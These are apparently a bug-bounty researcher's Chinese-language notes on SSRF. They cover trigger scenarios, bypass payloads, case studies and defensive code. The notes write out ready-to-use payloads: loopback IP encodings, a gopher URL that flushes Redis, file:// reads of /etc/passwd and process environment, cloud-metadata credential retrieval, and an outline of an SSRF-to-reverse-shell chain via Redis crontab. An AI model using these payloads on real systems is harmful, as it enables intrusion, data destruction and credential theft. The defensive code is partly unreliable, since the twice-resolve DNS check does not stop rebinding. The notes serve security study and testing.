# SSRF 漏洞深度分析

> 小白的安全研究笔记 | 2026-05-21

## 什么是 SSRF

SSRF（Server Side Request Forgery，服务端请求伪造）是一种漏洞，攻击者可以让服务器发起任意 HTTP 请求，从而：
- 访问内网资源（数据库、管理后台、元数据服务）
- 绕过防火墙（从内部发起请求）
- 读取本地文件（`file:///etc/passwd`）
- 扫描内网端口

## 为什么 SSRF 在 SRC 中重要

1. **危害高**：可以访问内网，影响范围大
2. **容易被忽略**：很多开发者不知道服务器也能被"钓鱼"
3. **变种多**：URL 解析绕过、协议切换、DNS 重绑定等
4. **赏金高**：在 HackerOne 上，SSRF 通常 P1-P2 级别

## 常见触发场景

### 1. URL 导入/预览
```
用户输入 URL → 服务器抓取内容 → 返回给用户
```
典型场景：社交平台链接预览、文档导入、网页截图服务

### 2. Webhook/回调
```
用户设置回调 URL → 服务器向该 URL 发送请求
```
典型场景：支付回调、第三方集成、RSS 订阅

### 3. 文件处理
```
用户提供远程文件 URL → 服务器下载并处理
```
典型场景：图片处理、PDF 生成、文件转换

### 4. API 集成
```
用户配置外部 API 地址 → 服务器调用该 API
```
典型场景：OAuth 回调、SSO 集成、数据同步

## 绕过技巧

### 基础绕过
```python
# IP 地址变体
http://127.0.0.1
http://0.0.0.0
http://localhost
http://[::1]           # IPv6
http://0x7f000001      # 十六进制
http://2130706433      # 十进制
http://0177.0.0.1      # 八进制

# URL 编码
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
```

### DNS 重绑定
```python
# 1. 注册一个域名，第一次解析到合法 IP，第二次解析到 127.0.0.1
# 2. 利用 DNS TTL 缓存过期
# 工具：rbndr.us（在线 DNS 重绑定服务）
```

### 协议绕过
```python
# Gopher 协议（最强大）
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# Dict 协议
dict://127.0.0.1:6379/info

# File 协议
file:///etc/passwd
file:///proc/self/environ
```

### URL 解析差异
```python
# 利用 @ 符号
http://evil.com@127.0.0.1
http://127.0.0.1@evil.com

# 利用 # 片段
http://127.0.0.1#@evil.com

# 利用 ? 参数
http://127.0.0.1?q=evil.com

# 利用不同 URL 解析器的差异
# Python urllib vs requests vs 浏览器，解析方式不同
```

## 实战案例

### 案例 1：通过图片上传触发 SSRF

**场景**：某平台支持从 URL 导入图片

**发现过程**：
1. 上传图片时，URL 参数改为 `http://169.254.169.254/latest/meta-data/`
2. 服务器返回了 AWS 元数据（IAM 角色、临时凭证）
3. 通过元数据获取了临时 AWS Access Key

**影响**：可以访问 AWS 内部服务，潜在的云环境接管

### 案例 2：通过 Webhook 获取内网信息

**场景**：某 SaaS 平台的 Webhook 配置

**发现过程**：
1. 设置 Webhook URL 为 `http://10.0.0.1:8080/actuator/env`
2. 服务器向该地址发送了测试请求
3. 返回了 Spring Boot Actuator 的环境变量（包含数据库密码）

**影响**：内网敏感信息泄露

### 案例 3：SSRF + Redis 未授权访问

**场景**：某应用有 URL 预览功能，内网有未授权的 Redis

**利用链**：
```
SSRF → Gopher 协议 → Redis 6379 端口 → 写入 crontab → RCE
```

**步骤**：
1. 构造 Gopher payload，向 Redis 发送 `SET crontab "...反弹shell..."`
2. 通过 SSRF 发送该 payload
3. Redis 执行 crontab，服务器反弹 shell

## 防御方案

### 1. URL 白名单
```python
ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_HOSTS
```

### 2. 禁用危险协议
```python
ALLOWED_SCHEMES = ['http', 'https']

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ALLOWED_SCHEMES
```

### 3. IP 地址黑名单
```python
import ipaddress

def is_private_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback
    except ValueError:
        return False
```

### 4. DNS 重绑定防护
```python
# 解析两次 DNS，比较结果
def check_dns_rebinding(hostname):
    ip1 = socket.gethostbyname(hostname)
    ip2 = socket.gethostbyname(hostname)
    return ip1 == ip2
```

## 挖掘思路清单

- [ ] 找到所有用户可控 URL 输入点
- [ ] 测试 HTTP/HTTPS 以外的协议（gopher://, dict://, file://）
- [ ] 测试 IP 地址变体（十六进制、十进制、八进制、IPv6）
- [ ] 测试 URL 解析差异（@、#、?、%00）
- [ ] 测试 DNS 重绑定
- [ ] 检查内网常见端口（6379 Redis, 3306 MySQL, 8080 内网管理）
- [ ] 检查云环境元数据（169.254.169.254）
- [ ] 检查是否有 SSRF → RCE 的可能（Redis、Memcached、SMTP）

## 参考资源

- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [Pentester Land SSRF Writeups](https://pentester.land/writeups/)

---

*持续更新中。如有补充，欢迎 PR。*
